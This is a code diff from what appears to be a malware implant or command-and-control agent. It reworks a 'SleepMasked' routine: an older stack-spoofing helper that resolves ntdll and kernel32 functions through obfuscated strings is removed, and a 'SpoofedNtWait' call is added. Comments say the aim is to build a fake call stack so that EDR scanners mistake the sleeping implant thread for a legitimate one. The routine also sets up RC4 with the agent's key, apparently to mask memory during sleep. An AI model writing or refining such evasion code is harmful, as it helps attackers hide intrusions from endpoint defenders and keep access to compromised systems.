@@ -74,41 +74,6 @@ static BOOL FindOwnText(PVOID *baseOut, DWORD *sizeOut) {
     return FALSE;
 }
 
-/* ── Stack spoof helpers ─────────────────────────────────────────────────── */
-/*
- * Build a fake CONTEXT where:
- *   Rsp points at a fake stack containing a kernel32!BaseThreadInitThunk frame
- *   Rip points at ntdll!NtWaitForSingleObject (the function entry, not a gadget)
- *
- * The calling-thread scanner will unwind:
- *   NtWaitForSingleObject ← BaseThreadInitThunk ← RtlUserThreadStart
- * which is identical to a legitimate sleeping thread-pool timer callback.
- */
-
-/* Fake stack frame layout (8 quadwords = 64 bytes) */
-typedef struct {
-    ULONG_PTR ret_from_BaseThread;   /* return into RtlUserThreadStart */
-    ULONG_PTR ret_from_NtWait;       /* return into BaseThreadInitThunk */
-    ULONG_PTR padding[6];            /* shadow space + alignment */
-} FakeFrame;
-
-static PVOID s_ntWaitAddr         = NULL;
-static PVOID s_baseThreadAddr     = NULL;
-static PVOID s_rtlUserThreadAddr  = NULL;
-
-__attribute__((section(".slpmsk")))
-static void InitSpoofAddrs(void) {
-    if (s_ntWaitAddr) return;
-    HMODULE ntdll = GetModuleHandleA(OBFSTR("ntdll.dll"));
-    HMODULE k32   = GetModuleHandleA(OBFSTR("kernel32.dll"));
-    if (ntdll) {
-        s_ntWaitAddr        = (PVOID)GetProcAddress(ntdll, OBFSTR("NtWaitForSingleObject"));
-        s_rtlUserThreadAddr = (PVOID)GetProcAddress(ntdll, OBFSTR("RtlUserThreadStart"));
-    }
-    if (k32)
-        s_baseThreadAddr = (PVOID)GetProcAddress(k32, OBFSTR("BaseThreadInitThunk"));
-}
-
 /* ── Timer-thread trampoline ─────────────────────────────────────────────── */
 /*
  * Instead of NtDelay (which keeps our real stack visible), we:
@@ -142,8 +107,6 @@ void SleepMasked(LONGLONG ms) {
         return;
     }
 
-    InitSpoofAddrs();
-
     RC4State rc4;
     RC4Init(&rc4, g_agent.aes_key, AES_KEY_LEN);
 
@@ -163,28 +126,16 @@ void SleepMasked(LONGLONG ms) {
         HANDLE hTimer = CreateThread(NULL, 0, TimerThread, &ta, 0, NULL);
 
         if (hTimer) {
-            /* Stack-spoof: replace our call-frame with a fake one */
-            if (s_ntWaitAddr && s_baseThreadAddr) {
-                /* Allocate fake stack region */
-                FakeFrame *ff = (FakeFrame*)ImplantAlloc(sizeof(FakeFrame) + 256);
-                if (ff) {
-                    memset(ff, 0, sizeof(FakeFrame) + 256);
-                    ff->ret_from_NtWait    = (ULONG_PTR)s_baseThreadAddr;
-                    ff->ret_from_BaseThread = (ULONG_PTR)s_rtlUserThreadAddr;
-
-                    /* Use NtWaitForSingleObject directly so call-stack shows it */
-                    typedef NTSTATUS (WINAPI *pfnNtWait)(HANDLE, BOOLEAN, PLARGE_INTEGER);
-                    pfnNtWait pWait = (pfnNtWait)s_ntWaitAddr;
-                    LARGE_INTEGER timeout;
-                    timeout.QuadPart = -(LONGLONG)ms * 10000LL;
-                    pWait(hEvent, FALSE, &timeout);
-                    ImplantFree(ff);
-                } else {
-                    WaitForSingleObject(hEvent, (DWORD)ms);
-                }
-            } else {
-                WaitForSingleObject(hEvent, (DWORD)ms);
-            }
+            /* SpoofedNtWait: builds multi-level fake call stack in-place on the
+             * thread's stack before entering the kernel wait.  While the thread
+             * is parked, EDR scanners see:
+             *   ntdll!NtWaitForSingleObject
+             *   → kernel32!BaseThreadInitThunk+N
+             *   → ntdll!RtlUserThreadStart+K
+             * Falls back to a plain indirect syscall if gadgets weren't resolved. */
+            LARGE_INTEGER timeout;
+            timeout.QuadPart = -(LONGLONG)ms * 10000LL;
+            SpoofedNtWait(hEvent, FALSE, &timeout);
             CloseHandle(hTimer);
         } else {
             /* Timer thread failed — plain wait */
